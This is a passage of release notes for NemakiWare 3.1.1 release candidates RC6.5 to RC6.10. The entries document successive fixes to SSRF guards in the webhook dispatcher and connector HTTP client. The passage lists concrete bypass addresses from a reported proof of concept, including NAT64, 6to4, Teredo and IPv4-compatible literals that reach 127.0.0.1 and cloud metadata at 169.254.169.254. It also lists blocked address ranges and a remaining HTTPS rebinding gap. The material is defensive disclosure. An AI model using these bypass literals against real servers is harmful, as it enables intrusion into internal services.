  (removed 240 lines of duplicated classifier, delegates to
  `SsrfGuard`; preserves operator log categorization).
- `core/src/main/java/jp/aegif/nemaki/rest/ingest/AdapterHttpClient.java`
  (removed 110 lines of duplicated classifier, delegates to
  `SsrfGuard`).

**Tests (2 files)**:
- `core/src/test/java/jp/aegif/nemaki/security/SsrfGuardTest.java`
  (NEW, 30 cases).
- `core/src/test/java/jp/aegif/nemaki/webhook/HttpWebhookDispatcherTest.java`
  (replaced reflection on private `extractEmbeddedIpv4` with
  direct `SsrfGuard.extractEmbeddedIpv4` call).

**Tooling (1 file)**:
- `scripts/validate-soc-templates.sh` (new `Phase 1.4.1`
  source-tree NUL scan).

**Docs**: `RELEASE_NOTES.md`, `CLAUDE.md`, `REVIEW_PACKET.md`.

### Migration / compatibility

No public API change. No new properties. No schema / patch / view
/ Mango index changes. The refactor is byte-equivalent at the
classifier-output level. Operators with existing connectors,
webhooks, or schedulers see no behavioural change.

JVM-wide `jdk.httpclient.allowRestrictedHeaders=host` property
already set in RC6.9 (production via `CATALINA_OPTS`, tests via
surefire `<argLine>`). RC6.10 doesn't touch this surface.

---

## 3.1.1-RC6.9 — Security: preserve original Host header on HTTP IP-pin (closes shared-vhost compat caveat) + honest HTTPS Javadoc
_Release candidate on `release/3.1.1-RC6` (2026-05-31), branched
off `v3.1.1-RC6.8` (`cd82452f4`)._

Fifth RC in the SSRF hardening cycle. RC6.8 post-tag review
raised two findings to Medium:
- **P2** — HTTPS DNS rebinding wording was overstated (residual
  TCP-connect SSRF). Addressed in the doc layer by `d910820d7`
  (post-RC6.8 doc commit on REVIEW_PACKET / RELEASE_NOTES /
  CLAUDE) AND now in the Javadoc by this RC.
- **P3** — HTTP IP-pin sends `Host: <IP>` and breaks shared-vhost
  HTTP deployments. Addressed by this RC's code fix.

### P3 fix — HTTP IP-pin now preserves original Host header

`pinRequestToValidatedAddress` (in `AdapterHttpClient`) previously
rewrote the HTTP URI to the validated IP literal and let the JDK
default the `Host` header to that IP. Shared-vhost reverse
proxies (one IP serving multiple Mattermost / Salesforce on-prem
instances under different hostnames) would misroute / 404.

Now rewrites URI to IP literal AND explicitly sets
`b.header("Host", originalHostHeader)`. Uses the documented JDK
escape hatch via the startup property
`-Djdk.httpclient.allowRestrictedHeaders=host`, set in:
- Production: `docker/core/Dockerfile{,.jakarta,.simple}` —
  `CATALINA_OPTS` / `JAVA_OPTS` augmented.
- Tests: `core/pom.xml` surefire `<argLine>`.
- Defensive fallback: a static `{}` initializer at the top of
  `AdapterHttpClient` sets the property additively at class load
  time, preserving any other operator-set values.

JVM-wide effect: other code in the same JVM that uses
`HttpRequest.Builder.header("Host", ...)` will now succeed where
it previously threw `IllegalArgumentException`. Intentional and
matches the documented JDK escape hatch.

### Javadoc honesty fix

`AdapterHttpClient.pinRequestToValidatedAddress` Javadoc now
reflects the actual security boundary (matching the post-RC6.8
doc fix `d910820d7`):
- **HTTP**: "DNS rebinding closed at the network layer" — IP-pin
  prevents any TCP connection to a rebound IP. Host header
  preservation noted.
- **HTTPS**: "TLS-bounded, NOT fully closed" — re-validation
  catches pre-resolve rebinds but a microsecond race remains;
  TLS cert verification stops data-exchange SSRF but TCP-connect
  SSRF (port scan / service fingerprint / inbound-TCP side
  effects) is residual. Real fix queued: custom `SocketFactory`
  pinning IP at TCP-connect time.

### Tests

- 2 new regression tests in `AdapterRegistryTest`:
  - `pinRequestPreservesOriginalHostHeaderOnHttpPin`: rewritten
    URI uses IP literal, `Host` header carries original
    `hostname:port`.
  - `pinRequestPreservesOriginalHostHeaderWithoutPort`: default
    port 80 case (no `:port` suffix in `Host`).
- All 7 adapter contract tests (Slack 12 / Teams 11 /
  Mattermost 12 / Notion 8 / Salesforce 11 / M365 Mail 9 /
  Chatwork 13 = **76 PASS**) still pass — WireMock accepts any
  `Host` header.
- **Full focused regression: 343/343 PASS** (was 265 in RC6.8;
  +78 from including all 7 adapter contract test classes in the
  focused regression set + 2 new Host-preserve tests).

### Change scope vs RC6.8 (precise)

- **Changed in RC6.9**:
  - `core/src/main/java/jp/aegif/nemaki/rest/ingest/AdapterHttpClient.java`
    (+76 lines: static init for JVM property, honest Javadoc,
    Host header preservation in pinRequestToValidatedAddress)
  - `core/src/test/java/jp/aegif/nemaki/rest/ingest/AdapterRegistryTest.java`
    (+31 lines: 2 new Host-preserve tests)
  - `core/pom.xml` (surefire argLine adds
    `-Djdk.httpclient.allowRestrictedHeaders=host`)
  - `docker/core/Dockerfile`, `Dockerfile.jakarta`,
    `Dockerfile.simple` (CATALINA_OPTS / JAVA_OPTS augmented)
  - `RELEASE_NOTES.md`, `CLAUDE.md`, `REVIEW_PACKET.md`,
    `README.md`, `AGENTS.md` (RC6.9 references)
- **Unchanged from RC6.8** (byte-equal):
  - `HttpWebhookDispatcher.java` (RC6.5+RC6.6 canonical fix)
  - All other Java surface
  - All TypeScript surface
  - All properties, patches, views, Mango indexes, migrations,
    DB bootstrap
  - SOC templates + validator script
  - `docs/MANUAL-VERIFICATION-CONNECTORS.md`

### Commit + tag relationship

- Security fix + Javadoc + JVM property: `e45d172bb`
- RC6.9 release-package commit (RELEASE_NOTES + CLAUDE + REVIEW_PACKET): subsequent
- **`v3.1.1-RC6.9` annotated tag target**: release-package commit

The previous candidate `v3.1.1-RC6.8` is **not force-updated**
and remains at peeled commit `cd82452f4` as a historical
milestone.

### Follow-up status

**Resolved in this RC**:
- HTTP IP-pin shared-vhost compat caveat (RC6.8 post-tag P3).
- AdapterHttpClient Javadoc honesty (RC6.8 post-tag P2 echo).

**Remaining (Medium residual + carry-forward)**:
- **HTTPS DNS pinning via SocketFactory** (Medium residual SSRF) —
  the TCP-connect SSRF class for HTTPS is unchanged. Real fix
  requires a custom SocketFactory (or switch to HttpURLConnection
  like `HttpWebhookDispatcher`). Tracked in §6.
- `isAddressSafe` + `extractEmbeddedIpv4` shared utility extract
  (tech debt, 2 consumers).
- Other connector orchestrator endpoint pre-checks (cosmetic).
- Purview / Atlas / OIDC discovery / Graph download SSRF guard
  (admin-config surface).
- Repo-wide NUL byte pre-commit scan.

---

## 3.1.1-RC6.8 — Security: deeper SSRF closure in AdapterHttpClient — DNS rebinding pin, runtime revalidation, multi-hop redirect resolve
_Release candidate on `release/3.1.1-RC6` (2026-05-30), branched
off `v3.1.1-RC6.7` (`b48d9e0c1`)._

Fourth RC in the SSRF hardening cycle. External reviewer ran a
deeper adversarial pass on the RC6.7 `AdapterHttpClient` fix and
identified 3 further gaps. All closed.

### P1 — DNS rebinding gap (Java HttpClient re-resolved hosts)

`AdapterHttpClient.validateExternalUrl` resolved + validated the
host once at config time, but `sendWithRetry` then handed the
original `HttpRequest` to `HttpClient.send`, which performs its
OWN DNS lookup at connect time. An attacker controlling the
configured hostname's DNS could return a public IP during
validation and a private / loopback / cloud-metadata IP at
connection time — classic DNS rebinding.

Fix: new `pinRequestToValidatedAddress(request)` is called inside
both `sendWithRetry` and `sendWithRedirectValidation`:

- **HTTP path — DNS rebinding closed at the network layer**.
  Re-resolves at send time, validates every resolved address
  against `isAddressSafe`, then rewrites the URI to use the
  validated IP literal (bracketed for IPv6). The JDK `HttpClient`
  connects to the pinned IP — no TCP connection to a rebound IP
  is possible after the send-time validation succeeds.

  **⚠ Compatibility caveat — shared-vhost HTTP deployments**:
  the JDK `HttpClient.Builder` restricts the `Host` header by
  default (only overridable via the JVM startup property
  `-Djdk.httpclient.allowRestrictedHeaders=host`, which we do
  NOT set). After URI rewrite, the JDK sends `Host: <IP>` rather
  than `Host: <original-hostname>`. Connector adapters that
  target a dedicated server (Mattermost / Salesforce on-prem on
  its own IP, Slack/Teams/Notion/etc. on public DNS) are
  unaffected. **Name-based virtual-host deployments** (e.g. a
  reverse proxy serving several Mattermost instances under
  different hostnames on the same IP) WILL misroute — the proxy
  cannot match a vhost on an IP-only `Host` header. Setting the
  connector endpoint to the IP directly does NOT fix this
  (the vhost match requires the hostname). Operators hitting
  this need either the JVM property + a host-preserving overload
  (queued for a future RC) OR migration to HTTPS (TLS SNI
  carries the hostname correctly).

- **HTTPS path — TLS-bounded, NOT fully closed**. Returns the
  request unchanged. The send-time re-validation (via
  `InetAddress.getAllByName`) catches rebound IPs *if* the
  rebound resolve happens before the JDK's own resolve inside
  `HttpClient.send`. **A microsecond race window remains**: a
  DNS attacker rebinding within that window can still cause
  the JDK to TCP-connect to the internal IP. The TLS handshake
  then fails against the original hostname's cert, so:
  - **Data-exchange SSRF closed**: no body read, no token
    leak, no internal API call succeeds.
  - **TCP-connect SSRF residual**: attacker can still
    port-scan internal hosts, time-fingerprint internal
    services, and trigger inbound-TCP/TLS-handshake side
    effects on internal services. Closing this fully requires
    a custom `SocketFactory` pinning the IP at TCP-connect
    time while keeping SNI/hostname-verification on the
    original hostname. **Tracked as Medium residual risk in
    §6 follow-up.**

- Unresolvable host throws `SecurityException` (behaviour change
  from "let HttpClient try and fail with a network error" to
  "fail fast with a security-flavoured error").

### P2 — Runtime revalidation gap (saved-before endpoints could bypass)

`ConnectorDefinitionServiceImpl` validates endpoints on save, but
`MattermostFetchOrchestrator` (line 42) and
`SalesforceFetchOrchestrator` (line 45) passed
`connector.getEndpoint()` directly to the adapter without a
runtime check. An endpoint saved BEFORE RC6.7 hardening landed,
or modified at storage level (CouchDB direct edit), could reach
the adapter without revalidation.

Fix: added explicit `AdapterHttpClient.validateExternalUrl(
connector.getEndpoint())` at the orchestrator entry point for
both Mattermost and Salesforce. Defence-in-depth — the P1 fix
above closes the actual gap by re-validating at send time, but
the orchestrator-level check fails earlier with a clearer audit
message and avoids constructing the adapter for an
obviously-bad endpoint.

### P3 — Multi-hop relative redirect resolve correctness

`sendWithRedirectValidation` called `request.uri().resolve(
location)` on every loop iteration but `request` was never
updated. A second relative `Location` (e.g. `/file` returned from
a redirect that itself jumped to a different host) resolved
against the **original** URL, not the current target.

Fix: track `currentRequest` through the loop and use
`currentRequest.uri().resolve(location)`. Correctness fix; not
exploitable as SSRF in isolation (the wrongly-resolved URL is also
the URL we send to), but matters for multi-host redirect chains
where the intermediate host's relative paths should resolve
against that host's authority.

### Tests

- 5 new regression tests in `AdapterRegistryTest`:
  - `pinRequestRewritesHttpUriToValidatedIpv4Literal` — verifies
    HTTP URI rewrite preserves path + query.
  - `pinRequestLeavesHttpsUriUnchanged` — verifies HTTPS path
    returns the original URI (TLS handles rebinding).
  - `pinRequestThrowsWhenHostResolvesToBlockedIpv4` — loopback
    rebind throws.
  - `pinRequestThrowsWhenHostResolvesToBlockedIpv6Transition` —
    NAT64-wrapped metadata throws.
  - `pinRequestPreservesNonRestrictedHeadersOnHttpPin` — verifies
    Authorization / X-Custom-* headers carry over to the
    pinned request.
- Test infrastructure: `NotionConnectorAdapterTest`,
  `SalesforceConnectorAdapterTest`,
  `MattermostConnectorAdapterTest` now set
  `nemaki.ingest.allowLocalhost=true` in `@BeforeEach` and clear
  in `@AfterEach`. The P1 fix means `sendWithRetry` validates
  every request including the WireMock localhost endpoints these
  tests use. (Other 4 adapter test classes already set this.)

  - HttpWebhookDispatcherTest + AdapterRegistryTest: **78 PASS**
    (now: 59 webhook + 24 adapter-registry; was 78 in RC6.7,
    same total because AdapterRegistry +5 in this RC).
  - 7 adapter contract tests: **71 PASS** (Slack 12 / Teams 11 /
    Mattermost 12 / Notion ? / Salesforce ? / M365 9 /
    Chatwork 13 — Notion and Salesforce now PASS that previously
    would have failed under P1 without the test-mode prop).
  - Full 16-class focused regression: **265/265 PASS** (was 260
    in RC6.7; +5 from new pinRequest tests).

### Change scope vs RC6.7 (precise)

- **Changed in RC6.8**:
  - `core/src/main/java/jp/aegif/nemaki/rest/ingest/AdapterHttpClient.java`
    (+170 lines: pinRequestToValidatedAddress + isRestrictedHeader
    helper + multi-hop redirect fix + sendWithRetry call)
  - `core/src/main/java/jp/aegif/nemaki/rest/ingest/chat/MattermostFetchOrchestrator.java`
    (+9 lines: validateExternalUrl at orchestrator entry)
  - `core/src/main/java/jp/aegif/nemaki/rest/ingest/record/SalesforceFetchOrchestrator.java`
    (+9 lines: same pattern)
  - `core/src/test/java/jp/aegif/nemaki/rest/ingest/AdapterRegistryTest.java`
    (+65 lines: 5 new pin tests)
  - 3 adapter test classes get the test-mode property setUp/tearDown
  - `RELEASE_NOTES.md`, `CLAUDE.md`, `REVIEW_PACKET.md`, `README.md`,
    `AGENTS.md` (RC6.8 references)
- **Unchanged from RC6.7** (byte-equal):
  - `HttpWebhookDispatcher.java` (the RC6.5+RC6.6 canonical fix)
  - All other Java surface (other 9 connector adapters, etc.)
  - All TypeScript surface
  - All properties, patches, views, Mango indexes, migrations,
    DB bootstrap
  - SOC templates + `scripts/validate-soc-templates.sh`
  - `docs/MANUAL-VERIFICATION-CONNECTORS.md`

### Commit + tag relationship

- Security fix (P1+P2+P3): `892ccfdd9`
- RC6.8 release-package commit (RELEASE_NOTES + CLAUDE + REVIEW_PACKET): subsequent
- **`v3.1.1-RC6.8` annotated tag target**: release-package commit

The previous candidate `v3.1.1-RC6.7` is **not force-updated** and
remains at peeled commit `b48d9e0c1` as a historical milestone.

### Follow-up status

**Resolved in this RC**:
- DNS rebinding at AdapterHttpClient send time (P1).
- Runtime endpoint revalidation in Mattermost + Salesforce
  orchestrators (P2 — also subsumed by P1's send-time
  revalidation; the orchestrator-level check is defence-in-depth).
- Multi-hop relative redirect resolve correctness (P3).

**Remaining (informational, not blocking)**:
- HTTPS DNS pinning via custom SocketFactory — both
  `HttpWebhookDispatcher` HTTPS and `AdapterHttpClient` HTTPS rely
  on TLS cert verification for rebinding defence; pinning would
  add layered defence but requires either the JVM property
  workaround or HttpURLConnection refactor.
- `isAddressSafe` + `extractEmbeddedIpv4` extraction to shared
  `SsrfGuard` utility (now 2 consumers; refactor when 3rd appears).
- Other orchestrators (Slack/Teams/Notion/Chatwork/M365/etc.)
  could also get explicit `validateExternalUrl` calls for
  consistency with Mattermost+Salesforce. P1 fix means they're
  protected at send time anyway, so this is cosmetic.
- Purview / Atlas / OIDC discovery / Graph download outbound
  surfaces (RC6.7 carry-forward).
- All RC6.4-RC6.7 carry-forward items.

---

## 3.1.1-RC6.7 — Security: horizontal SSRF fix for AdapterHttpClient (all 11 connectors) + literal NUL cleanup
_Release candidate on `release/3.1.1-RC6` (2026-05-30), branched
off `v3.1.1-RC6.6` (`c8b37150a`)._

Horizontal expansion of the RC6.5+RC6.6 `HttpWebhookDispatcher`
SSRF fix. Reviewer identified that the same vulnerability class
exists in `AdapterHttpClient.validateExternalUrl` — the shared
outbound HTTP validation used by all 11 external-ingest connectors
(Slack / Teams / Mattermost / Notion / Salesforce / M365 Mail /
Gmail / Chatwork / Box / Dropbox / IMAP) AND by
`ConnectorDefinitionServiceImpl` (endpoint validation at connector
config save time) AND by `IngestWebhookController` (notification
callback URL validation).

### Horizontal SSRF fix — AdapterHttpClient

Before this RC, `validateExternalUrl` only checked the JDK's
`isLoopback` / `isLinkLocal` / `isSiteLocal` / `isAnyLocal`
predicates. An attacker who could supply an adapter endpoint URL
(admin during connector setup, or via webhook scope / redirect
chain at runtime) could reach internal IPv4 destinations through
the same bypass vectors that the RC6.5+RC6.6 fix already closed in
`HttpWebhookDispatcher`:

| Bypass vector | Reaches |
|---|---|
| NAT64 `64:ff9b::/96` | embedded IPv4 (127.0.0.1, 169.254.169.254, etc.) |
| NAT64 `64:ff9b:1::/48` (RFC 6052 §2.2 /48 layout) | embedded IPv4 |
| 6to4 `2002::/16` | embedded IPv4 in bytes 2-5 |
| Teredo `2001::/32` | embedded IPv4 in bytes 12-15 (one's-complement) |
| IPv4-compatible `::a.b.c.d` | embedded IPv4 in bytes 12-15 |
| IPv4 special-use ranges (`0/8`, `100.64/10`, `192.0.0/24`, `198.18/15`, `240/4`, `255.255.255.255`) | direct IPv4 not classified by JDK predicates |

Fix: replicate the proven `isAddressSafe` + `extractEmbeddedIpv4`
design from `HttpWebhookDispatcher` into `AdapterHttpClient`.

### Redirect handling tightened

- `SHARED` HttpClient: `Redirect.NORMAL` → **`Redirect.NEVER`**.
  Was letting the JDK auto-follow redirects WITHOUT revalidating
  the target — a known SSRF anti-pattern.
- `sendWithRedirectValidation` now resolves relative `Location`
  headers (e.g. `Location: /admin`) against the original request
  URI before calling `validateExternalUrl`. Previously the
  relative form would either fail URL parsing or be misinterpreted.

### Tests

- 3 new regression tests in `AdapterRegistryTest`: IPv6 transition
  wraps (5 forms), IPv4 special-use ranges (3 representatives),
  SHARED HttpClient redirect setting.
- `HttpWebhookDispatcherTest` (59) + `AdapterRegistryTest` (19)
  = **78 PASS** for the SSRF surface.
- All 6 connector adapter contract tests (Slack / Teams /
  Mattermost / Notion / Salesforce / M365 Mail) PASS (63 total) —
  the `Redirect.NEVER` change does NOT break legitimate adapter
  API call patterns.
- Full 16-class focused regression: **260/260 PASS** (was 241 in
  RC6.6; +19 from including `AdapterRegistryTest` in the focused
  set + the 3 new security tests it gained).

### Other fix included in RC6.7

- `HttpWebhookDispatcherTest.java` line 481: literal NUL byte
  (`"with\x00nul"`) replaced with Java `\0` octal escape. Source
  file `file` classification changed from binary to text; `grep
  -c @Test` now correctly returns 59 (was 0 because the file was
  binary). Runtime behaviour unchanged — Java compiler resolves
  `\0` to the same NUL byte. Same class as RC6.1 P2-3
  (`ConnectorGovernanceTab.tsx` NUL fix). Commit `14b232475`.

### Code duplication note (recognized tech debt)

`isAddressSafe` + `extractEmbeddedIpv4` are now duplicated between
`HttpWebhookDispatcher` and `AdapterHttpClient`. Tracked for a
follow-up refactor (extract to a shared `SsrfGuard` utility).
For this hot security fix in-place duplication was safer than
refactoring both call sites under time pressure. Both copies
share identical byte-prefix detection logic; if a 3rd
transition format needs support, the refactor becomes mandatory.

### Out-of-scope hardening (intentional)

Purview / Atlas / OIDC discovery / Microsoft Graph download —
separate outbound HTTP surfaces with admin-configured IdP /
on-prem endpoint use cases. Applying this same blocklist
unconditionally would break legitimate internal integrations.
A future opt-in "production-mode" property OR explicit allowlist
is the right approach for those surfaces; this RC does NOT touch
them.

### Change scope vs RC6.6 (precise)

- **Changed in RC6.7**:
  - `core/src/main/java/jp/aegif/nemaki/rest/ingest/AdapterHttpClient.java`
    (+124 lines: isAddressSafe + extractEmbeddedIpv4 + redirect
    tightening)
  - `core/src/test/java/jp/aegif/nemaki/rest/ingest/AdapterRegistryTest.java`
    (+30 lines: 3 new security tests)
  - `core/src/test/java/jp/aegif/nemaki/webhook/HttpWebhookDispatcherTest.java`
    (literal NUL → `\0` escape; .class byte-equivalent)
  - `RELEASE_NOTES.md`, `CLAUDE.md`, `REVIEW_PACKET.md`, `README.md`,
    `AGENTS.md` (RC6.7 references)
- **Unchanged from RC6.6** (byte-equal):
  - All other Java surface (including HttpWebhookDispatcher.java —
    the RC6.5+RC6.6 fix is the canonical implementation reused as
    the design pattern for AdapterHttpClient)
  - All TypeScript surface (UI, services, tests)
  - All properties, patches, views, Mango indexes, migrations,
    DB bootstrap
  - SOC templates + `scripts/validate-soc-templates.sh`
  - `docs/MANUAL-VERIFICATION-CONNECTORS.md`

### Commit + tag relationship

- Test NUL fix: `14b232475` (already pushed pre-RC6.7)
- Security fix (AdapterHttpClient): `12994c342`
- RC6.7 release-package commit (RELEASE_NOTES + CLAUDE + REVIEW_PACKET): subsequent
- **`v3.1.1-RC6.7` annotated tag target**: release-package commit

The previous candidate `v3.1.1-RC6.6` is **not force-updated** and
remains at peeled commit `c8b37150a` as a historical milestone.

### Follow-up status

**Resolved in this RC**:
- Horizontal SSRF surface in `AdapterHttpClient` (NAT64 / 6to4 /
  Teredo / IPv4-compatible / IPv4 special-use) — same vector
  classes as RC6.5+RC6.6, but reachable via the connector dispatch
  path instead of the webhook dispatch path.
- Auto-follow redirect on SHARED HttpClient — flipped to
  `Redirect.NEVER`.
- Relative `Location` handling in `sendWithRedirectValidation`.
- Test source binary classification (literal NUL → escape).

**Remaining (informational, not blocking, all carry forward)**:
- Purview / Atlas / OIDC discovery / Graph download outbound
  surfaces — see "Out-of-scope hardening" above.
- HTTPS DNS pinning via custom SocketFactory (RC6.6 informational).
- `isAddressSafe` + `extractEmbeddedIpv4` extraction to shared
  utility (recognized tech debt above).

---

## 3.1.1-RC6.6 — Security: SSRF guard hardening — IPv4 special-use ranges + Teredo + RFC 6052 /48 NAT64
_Release candidate on `release/3.1.1-RC6` (2026-05-30), branched
off `v3.1.1-RC6.5` (`94de9d269`)._

Follow-on security RC on top of RC6.5. The RC6.5 fix closed the
obvious IPv6 transition holes (NAT64 well-known `64:ff9b::/96` +
6to4 `2002::/16` + IPv4-compatible `::a.b.c.d` + IPv4-mapped
`::ffff:a.b.c.d`). RC6.6 closes a second wave of bypasses an
attacker could pivot to:

### IPv4 special-use ranges

`isAddressSafe` now blocks 5 additional IANA special-purpose
ranges that were neither caught by `InetAddress.is{Loopback,
LinkLocal,SiteLocal,...}` nor the existing manual private-range
checks:

| Range | RFC | Why block |
|---|---|---|
| `0.0.0.0/8` | RFC 1122 §3.2.1.3 | "This" network — addresses beyond just `0.0.0.0` itself (which was already caught by `isAnyLocalAddress`) |
| `100.64.0.0/10` | RFC 6598 | Carrier-grade NAT / shared address space (internal on most ISP / cloud networks) |
| `192.0.0.0/24` | RFC 6890 | IETF protocol assignments (DS-Lite, NAT64 well-known, etc.) |
| `198.18.0.0/15` | RFC 2544 | Benchmarking / interconnect-test networks |
| `240.0.0.0/4` | RFC 1112 §4 | Reserved for future use, includes `255.255.255.255` limited broadcast |

### IPv6 transition format extensions

`extractEmbeddedIpv4` now recognizes 2 additional formats:

- **`64:ff9b:1::/48` (NAT64 local-use, RFC 8215)** — was only
  handled via best-effort /96-PLR extraction (bytes 12-15) in
  RC6.5. RC6.6 properly handles the RFC 6052 §2.2 /48 layout:
  IPv4[0..15] in bytes 6-7, reserved "u" octet in byte 8,
  IPv4[16..31] in bytes 9-10, suffix bytes 11-15 must be zero.
  When the suffix is NOT clear, falls back to the original
  /96-PLR extraction. Re-classification by `isAddressSafe`
  gates either result.
- **Teredo `2001::/32` (RFC 4380 §4)** — IPv6 tunnel-over-UDP
  prefix. Strict prefix check (bytes 0-3 = `20:01:00:00`) so
  other `2001::/16` addresses (`2001:db8::` documentation,
  `2001:4860::` Google, etc.) are NOT mis-extracted. The client
  IPv4 is stored as one's complement in bytes 12-15; decoded by
  `(byte) ~b[i]` before re-classification.

### Tests

`HttpWebhookDispatcherTest`: **59/59 PASS** (52 from RC6.5 + 7
new test methods + 2 additional assertions in the existing
extractor test).

- 3 IPv4 special-use block tests (100.64, 198.18, 240/4)
- 2 RFC 6052 /48 NAT64 (blocked loopback wrap, allowed 8.8.8.8 wrap)
- 2 Teredo (blocked 0.0.0.1 wrap via one's-complement of
  `ffff:fffe`, allowed 8.8.8.8 wrap via `f7f7:f7f7`)

### Residual note (informational, not a regression)

HTTPS dispatch still connects via the original hostname URL to
leverage TLS certificate validation against the declared hostname.
DNS rebinding between resolve-time and connect-time is mitigated
by TLS verification (an attacker would need a valid cert for the
target hostname on an internal server) — this is by design and
unchanged from prior RCs. A future hardening could pin HTTPS to
the resolved IP via a custom SocketFactory while keeping SNI /
hostname verification on the original hostname; not required for
this RC's scope.

### Change scope vs RC6.5 (precise)

- **Changed in RC6.6**:
  - `core/src/main/java/jp/aegif/nemaki/webhook/HttpWebhookDispatcher.java`
    (+67 lines: 5 IPv4 range checks + RFC 6052 /48 + Teredo)
  - `core/src/test/java/jp/aegif/nemaki/webhook/HttpWebhookDispatcherTest.java`
    (+67 lines: 7 new test methods + 2 inline assertions)
  - `RELEASE_NOTES.md`, `CLAUDE.md`, `REVIEW_PACKET.md`, `README.md`,
    `AGENTS.md` (RC6.6 references)
- **Unchanged from RC6.5** (byte-equal):
  - All other Java surface
  - All TypeScript surface (UI, services, tests)
  - All properties, patches, views, Mango indexes, migrations, DB bootstrap
  - SOC templates + `scripts/validate-soc-templates.sh`
  - `docs/MANUAL-VERIFICATION-CONNECTORS.md` (RC6.5's closure stands)

### Commit + tag relationship

- Security hardening: `ce2abf646`
- RC6.6 release-package commit (RELEASE_NOTES + CLAUDE + REVIEW_PACKET): subsequent
- **`v3.1.1-RC6.6` annotated tag target**: release-package commit

The previous candidate `v3.1.1-RC6.5` is **not force-updated** and
remains at peeled commit `94de9d269` as a historical milestone.

### Follow-up status

**Resolved in this RC**:
- 5 IPv4 special-use bypass surfaces (0/8 beyond 0.0.0.0, 100.64/10,
  192.0.0/24, 198.18/15, 240/4 + broadcast).
- 1 IPv6 transition format with incomplete RC6.5 handling
  (`64:ff9b:1::/48` now per RFC 6052 §2.2 /48 layout).
- 1 new IPv6 transition format added (`2001::/32` Teredo).

**Remaining (operator-side / future hardening, not blocking)**:
- HTTPS DNS pinning via custom SocketFactory (currently mitigated
  by TLS cert verification — see Residual note above).
- Network/TLS, SIEM credentials, notification routing — all carry
  forward from prior RCs.

---

## 3.1.1-RC6.5 — Security: SSRF guard unwraps IPv6 transition addresses (NAT64 / 6to4) + connector-area manual-verification doc closure
_Release candidate on `release/3.1.1-RC6` (2026-05-30), branched
off `v3.1.1-RC6.4` (`afdf4d832`)._

Single-fix security RC + accumulated doc fixes from three rounds of
external review on the connector-area manual-verification guide.

### Security fix — SSRF bypass via IPv6 transition addresses (CWE-918)

`HttpWebhookDispatcher.isAddressSafe` classified `InetAddress` via
`isLoopbackAddress` / `isLinkLocalAddress` / `isSiteLocalAddress` +
manual IPv4 range checks for 4-byte arrays + IPv6 ULA (`fc00::/7`)
check for 16-byte arrays. Missing: IPv6 transition addresses that
embed an IPv4 destination. The JDK does not classify those as local
because the prefixes (NAT64 `64:ff9b::/96` + `64:ff9b:1::/48`, 6to4
`2002::/16`, IPv4-compatible `::a.b.c.d`) are globally routable in
its view. An attacker (admin for the read-capable `/webhook/test`
endpoint, any `cmis:write` user for the event-dispatched config
path) could encode an internal IPv4 destination as such a literal
and the dispatcher would connect to the embedded internal endpoint
on dual-stack / NAT64 networks (kernel routes the literal to the
wrapped IPv4).

Reported via GitHub security advisory by **tonghuaroot** with a
working PoC: 5 internal targets reachable
(`64:ff9b::7f00:1` → 127.0.0.1, `64:ff9b::a9fe:a9fe` → cloud
metadata 169.254.169.254, `64:ff9b:1::7f00:1` → 127.0.0.1 via
RFC 8215 local-use prefix, `2002:7f00:1::` → 127.0.0.1 via 6to4,
`::7f00:1` → 127.0.0.1 via IPv4-compatible). Bypassed all existing
SSRF guards while `127.0.0.1`, `10.0.0.1`, `169.254.169.254`, and
`::ffff:127.0.0.1` were correctly blocked.

Fix in `core/src/main/java/jp/aegif/nemaki/webhook/HttpWebhookDispatcher.java`:

- New private `extractEmbeddedIpv4(InetAddress)` that returns the
  embedded `Inet4Address` for any of the 5 recognized transition
  formats (byte-prefix comparison; safe re-extraction even for
  non-/96 PLR NAT64 local-use because the result is re-classified).
- `isAddressSafe` now calls `extractEmbeddedIpv4` after the
  existing IPv6 ULA check and recursively re-runs itself on the
  result. If the embedded IPv4 hits any block rule (loopback /
  RFC 1918 / link-local 169.254 / multicast / etc.), the
  transition literal is blocked too.
- Logged at WARN (existing plain blocks remain at DEBUG) because
  hitting a transition wrap of a private/loopback target is an
  attempted bypass, not benign config.

15 new regression tests added covering each transition format
against blocked / allowed IPv4 targets, plus a direct test of the
extractor. Total `HttpWebhookDispatcherTest` count: 37 → 52 PASS.

Fix commit: `94d3355a4`.

### Manual-verification doc closure (3 rounds of external review)

After RC6.4 shipped, the connector-area manual-verification guide
(`docs/MANUAL-VERIFICATION-CONNECTORS.md`, 1300+ lines) went through
3 rounds of external review with live execution by the reviewer.
Each round surfaced doc/actual drift. All fixed and live-verified:

- **Round 1** (P1 ×4 + P2 ×3): zsh env-var word-splitting, multipart
  ingest `request` part required, POST/PUT slim responses (not full
  resource), `allowedFolderIds=[] + delegated=true` → 400 (not
  silent clear), scheduler status `.scheduledProfiles[]` wrapper,
  by-group field names (`groupType` not `principalType`, `userId`
  not `memberUserId`), UI `credentialRef` Form.Item doesn't exist.
- **Round 2** (P1 ×2 + P2 ×1): ACL parameter names (`addACEPrincipal[n]`
  / `addACEPermission[n][m]`, not `principalId[n]` / `permission[n]`
  — silent no-op), delegated profile `defaultConnectorId` collision
  with admin profile (`Only one enabled profile per defaultConnectorId`),
  Import Profile GET wrapper `{"profile":{...},"warnings":[...]}`.
- **Round 3** (P2 ×1 + self-review of 8 more): delegated
  schedulerEnabled=true → HTTP 403 `denialReason="SCHEDULER_REQUIRES_ADMIN"`
  (was "400 or 200 normalized"), plus self-review tightening of
  every "expect:" line to a single HTTP code + exact response shape.

Result: every documented HTTP code and message snippet is now
verified against the live RC6 HEAD stack. The pattern of vague
"X or Y" disjunctions in expect values is fully eliminated. The
guide added a §14 note explaining the `addACEPrincipal[n]` silent
no-op trap and the `defaultConnectorId` uniqueness constraint.

### Change scope vs RC6.4 (precise)

- **Changed in RC6.5**:
  - `core/src/main/java/jp/aegif/nemaki/webhook/HttpWebhookDispatcher.java` (security fix)
  - `core/src/test/java/jp/aegif/nemaki/webhook/HttpWebhookDispatcherTest.java` (15 new tests)
  - `docs/MANUAL-VERIFICATION-CONNECTORS.md` (3-round closure)
  - `docs/soc-templates/VALIDATION.md` (regenerated; same validator state)
  - `README.md`, `AGENTS.md` (RC6.5 references)
  - `REVIEW_PACKET.md`, `RELEASE_NOTES.md`, `CLAUDE.md` (this RC)
- **Unchanged from RC6.4** (byte-equal):
  - All other Java surface
  - All TypeScript surface (UI, services, tests)
  - All properties, patches, views, Mango indexes, migrations, DB bootstrap
  - All SOC templates + validator script (`scripts/validate-soc-templates.sh`)

### Commit + tag relationship

- Security fix (HttpWebhookDispatcher + tests): `94d3355a4`
